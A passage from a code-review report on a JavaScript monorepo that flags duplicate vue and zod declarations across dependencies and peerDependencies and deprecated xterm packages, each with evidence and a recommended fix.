recommendation: Send a pre-computed display name from the main process (where node:path is available), or split on /[\\\\/]/ in the renderer.

title: @talex-touch/utils lists vue as both a dependency and a peerDependency, risking duplicate Vue copies
summary: The published utils package declares vue as a hard dependency (^3.5.39) while also declaring it as a peer (^3.5.27). Consumers therefore get a second Vue instance nested under node_modules/@talex-touch/utils.
evidence: packages/utils/package.json:59 `"vue": "^3.5.27"` under peerDependencies and :67 `"vue": "^3.5.39"` under dependencies, in a package with :4 `"private": false` and :3 `"version": "1.0.50"`.
failure_scenario: Under pnpm's isolated layout (or any consumer whose app Vue version differs), utils' composables in packages/utils/renderer run against their own Vue instance. Reactivity created inside utils is invisible to the host app, `inject()`/`provide()` across the boundary returns undefined, and Vue logs 'You are running multiple copies of Vue'. In this repo the symptom is currently hidden by .npmrc shamefully-hoist=true.
recommendation: Remove `vue` from dependencies and keep only the peerDependency (add it to devDependencies for local typechecking).

title: @talex-touch/tuff-intelligence lists zod as both an exact dependency and a peerDependency
summary: zod is pinned exactly (3.25.76) in dependencies and simultaneously declared as a peer (^3.25.32), so consumers can end up with two zod copies and cross-copy instanceof/schema checks fail.
evidence: packages/tuff-intelligence/package.json:58 `"zod": "3.25.76"` under dependencies and :61 `"zod": "^3.25.32"` under peerDependencies, in a package published with :71 `"publishConfig": {"access": "public"}`.
failure_scenario: zod schemas are identity-sensitive: a ZodType produced by one copy fails `instanceof` in another, and @modelcontextprotocol/sdk (apps/core-app dependency, peer `zod: ^3.25 || ^4.0`) validates tool schemas by exactly that mechanism. A consumer on zod 3.26 gets the peer satisfied but still receives the nested exact 3.25.76 copy, so tool-schema validation silently rejects valid schemas.
recommendation: Keep zod only as a peerDependency (plus devDependency), or drop the peer and keep a caret range dependency — not both.

title: core-app depends on deprecated xterm@5.3.0 and xterm-addon-fit@0.8.0 (renamed to @xterm/*)
summary: The terminal UI uses the retired `xterm` package name, which upstream deprecated in favour of the @xterm scope; the old name receives no fixes.
evidence: apps/core-app/package.json:135 `"xterm": "^5.3.0",` :136 `"xterm-addon-fit": "^0.8.0"`. pnpm-lock.yaml:13819 `xterm@5.3.0: ... deprecated: This package is now deprecated. Move to @xterm/xterm instead.` and pnpm-lock.yaml:13813 `xterm-addon-fit@0.8.0: ... deprecated: This package is now deprecated. Move to @xterm/addon-fit instead.` No @xterm scope is installed anywhere in the workspace.
failure_scenario: xterm 5.3.0 is frozen at the 2023 release.
